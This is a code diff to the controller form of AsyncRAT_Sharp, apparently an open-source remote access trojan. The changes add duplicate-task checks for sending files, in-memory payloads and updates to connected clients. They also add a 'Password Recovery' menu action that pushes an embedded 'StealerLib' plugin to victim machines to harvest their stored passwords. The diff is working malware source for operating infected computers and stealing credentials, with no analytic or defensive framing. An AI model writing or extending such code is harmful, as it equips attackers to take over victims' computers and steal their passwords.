@@ -270,6 +270,18 @@ namespace AsyncRAT_Sharp
                     lv.Text = "SendFile: " + Path.GetFileName(openFileDialog.FileName);
                     lv.SubItems.Add("0");
                     lv.ToolTipText = Guid.NewGuid().ToString();
+
+                    if (listView4.Items.Count > 0)
+                    {
+                        foreach (ListViewItem item in listView4.Items)
+                        {
+                            if (item.Text == lv.Text)
+                            {
+                                return;
+                            }
+                        }
+                    }
+
                     Program.form1.listView4.Items.Add(lv);
                     Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
 
@@ -309,6 +321,18 @@ namespace AsyncRAT_Sharp
                     lv.Text = "SendMemory: " + Path.GetFileName(formSend.toolStripStatusLabel1.Tag.ToString());
                     lv.SubItems.Add("0");
                     lv.ToolTipText = Guid.NewGuid().ToString();
+
+                    if (listView4.Items.Count > 0)
+                    {
+                        foreach (ListViewItem item in listView4.Items)
+                        {
+                            if (item.Text == lv.Text)
+                            {
+                                return;
+                            }
+                        }
+                    }
+
                     Program.form1.listView4.Items.Add(lv);
                     Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
 
@@ -341,6 +365,18 @@ namespace AsyncRAT_Sharp
                     lv.Text = "Update: " + Path.GetFileName(openFileDialog.FileName);
                     lv.SubItems.Add("0");
                     lv.ToolTipText = Guid.NewGuid().ToString();
+
+                    if (listView4.Items.Count > 0)
+                    {
+                        foreach (ListViewItem item in listView4.Items)
+                        {
+                            if (item.Text == lv.Text)
+                            {
+                                return;
+                            }
+                        }
+                    }
+
                     Program.form1.listView4.Items.Add(lv);
                     Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
 
@@ -723,9 +759,6 @@ namespace AsyncRAT_Sharp
                     {
                         Clients client = (Clients)itm.Tag;
                         client.LV.ForeColor = Color.Red;
-                        string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder\\" + client.ID + "\\Recovery");
-                        if (!Directory.Exists(fullPath))
-                            Directory.CreateDirectory(fullPath);
                         ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                     }
                 }
@@ -1141,6 +1174,32 @@ namespace AsyncRAT_Sharp
                 }
             }
 
+        }
+
+        private void PASSWORDRECOVERYToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (listView4.Items.Count > 0)
+            {
+                foreach (ListViewItem item in listView4.Items)
+                {
+                    if (item.Text == "Recovery Password")
+                    {
+                        return;
+                    }
+                }
+            }
+
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Packet").AsString = "recoveryPassword";
+            msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.StealerLib);
+            ListViewItem lv = new ListViewItem();
+            lv.Text = "Recovery Password";
+            lv.SubItems.Add("0");
+            lv.ToolTipText = Guid.NewGuid().ToString();
+            listView4.Items.Add(lv);
+            listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
+
+            getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText));
         }
     }
 }
